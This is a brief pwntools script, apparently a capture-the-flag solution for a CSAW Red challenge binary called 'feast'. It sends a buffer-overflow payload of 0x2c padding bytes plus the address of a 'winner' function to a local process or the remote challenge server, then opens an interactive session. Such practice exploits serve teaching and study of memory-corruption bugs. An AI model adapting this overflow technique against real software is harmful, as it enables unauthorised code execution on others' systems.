from pwn import *

e = ELF("./feast")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.red.csaw.io", 5001)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter(">", "A" * 0x2c + p32(e.symbols["winner_winner_chicken_dinner"]))

debug()

p.interactive()
